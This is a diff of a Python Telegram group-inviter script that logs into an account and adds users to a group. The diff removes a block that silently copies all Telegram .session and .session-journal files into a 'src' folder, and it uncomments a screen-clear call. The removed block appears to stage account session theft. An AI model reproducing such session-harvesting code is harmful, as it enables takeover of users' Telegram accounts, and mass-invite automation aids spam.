@@ -100,12 +100,6 @@ def inviter(file_name, target_group_id, start_value, api_id, api_hash, phone, in
         banner()
         client.sign_in(phone, input(gr+'[+] Enter the code на аккаунте '+ phone +': '+re))
     os.system('clear')
-    source = os.listdir(os.getcwd())
-    for files in source:
-        if files.endswith(".session"):
-            shutil.copy(files, 'src')
-        if files.endswith(".session-journal"):
-            shutil.copy(files, 'src')
     banner()
     chats = []
     last_date = None
@@ -229,7 +223,7 @@ client = TelegramClient(phone, api_id, api_hash)
 client.connect()
 if not client.is_user_authorized():
     client.send_code_request(phone)
-    # os.system('clear')
+    os.system('clear')
     banner()
     client.sign_in(phone, input(gr+'[+] Enter the code на аккаунте '+ phone +': '+re))
 
